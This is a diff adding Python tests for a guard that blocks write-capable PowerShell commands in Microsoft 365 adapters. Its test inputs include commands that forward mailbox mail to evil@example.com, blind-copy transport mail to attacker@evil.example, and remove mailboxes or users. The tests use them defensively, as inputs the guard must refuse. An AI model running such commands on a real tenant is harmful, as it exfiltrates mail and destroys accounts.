@@ -548,3 +548,35 @@ def test_the_shipped_sharepoint_admin_read_is_the_one_the_guard_admits() -> None
     for method in ("POST", "PUT", "PATCH", "DELETE", "MERGE"):
         assert sharepoint_admin_request_violation(method, url, headers=headers)
     assert sharepoint_admin_request_violation("GET", url, headers=headers, body=b"<Request/>")
+
+
+# R078/R017: a bare word followed by '=' at a statement start is a command (pwsh passes '=' as an argument), so it is
+# judged like any other command; only a key inside an @{ } hashtable literal is skipped.
+@pytest.mark.parametrize("adapter", ["powershell_graph", "m365dsc"])
+@pytest.mark.parametrize(
+    "command",
+    [
+        "$p = @{Mailbox='alice'; ForwardTo='evil@example.com'}; New-InboxRule = @p",
+        "$p = @{ BlindCopyTo = 'attacker@evil.example' }; New-TransportRule = @p",
+        "Get-Mailbox; Remove-Mailbox = @p",
+        "Get-Mailbox | Remove-Mailbox =",
+        "Get-Mailbox; Remove-MgUser = $x",
+        "Get-A | Set-B = $null",
+        "New-InboxRule = 'x'",
+        "Get-Mailbox | Where-Object { Remove-Mailbox = $_ }",
+        "Get-Mailbox -Identity (Remove-Mailbox = 'a')",
+        "X = 1",
+    ],
+)
+def test_a_command_followed_by_equals_is_still_judged(adapter: str, command: str) -> None:
+    with pytest.raises(CommandRefused):
+        check_command(adapter, command)
+    assert classify_command(adapter, command).read_only is False
+
+
+def test_hashtable_keys_and_calculated_properties_stay_allowed() -> None:
+    script = (
+        "$p = @{ Identity = 'a'; ResultSize = 'Unlimited' }; Get-Mailbox @p | "
+        "Select-Object @{n='a';e={ $_.Name }}, @{ Name = 'b'; Expression = { $_.Alias } }"
+    )
+    assert check_command("powershell_graph", script) == ("Get-Mailbox", "Select-Object")
